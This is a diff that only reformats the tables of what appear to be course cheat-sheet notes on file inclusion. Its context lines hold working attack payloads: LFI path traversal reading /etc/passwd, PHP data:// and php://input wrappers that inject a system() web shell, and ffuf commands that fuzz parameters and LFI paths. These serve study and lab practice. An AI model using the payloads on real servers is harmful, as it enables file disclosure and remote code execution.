@@ -13,7 +13,7 @@ completedOn: 2024-02-27
 ## Local File Inclusion
 
 | **Command** | **Description** |
-| --------------|-------------------|
+| :--------------|:-------------------|
 | **Basic LFI** |
 | `/index.php?language=/etc/passwd` | Basic LFI |
 | `/index.php?language=../../../../etc/passwd` | LFI with path traversal |
@@ -30,7 +30,7 @@ completedOn: 2024-02-27
 ## Remote Code Execution
 
 | **Command** | **Description** |
-| --------------|-------------------|
+| :--------------|:-------------------|
 | **PHP Wrappers** |
 | `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with data wrapper |
 | `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
@@ -56,7 +56,7 @@ completedOn: 2024-02-27
 ## Misc
 
 | **Command** | **Description** |
-| --------------|-------------------|
+| :--------------|:-------------------|
 | `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
 | `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
 | `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
@@ -73,7 +73,7 @@ completedOn: 2024-02-27
 ## File Inclusion Functions
 
 | **Function** | **Read Content** | **Execute** | **Remote URL** |
-| ----- | :-----: | :-----: | :-----: |
+| :----- | :-----: | :-----: | :-----: |
 | **PHP** |
 | `include()`/`include_once()` | ✅ | ✅ | ✅ |
 | `require()`/`require_once()` | ✅ | ✅ | ❌ |
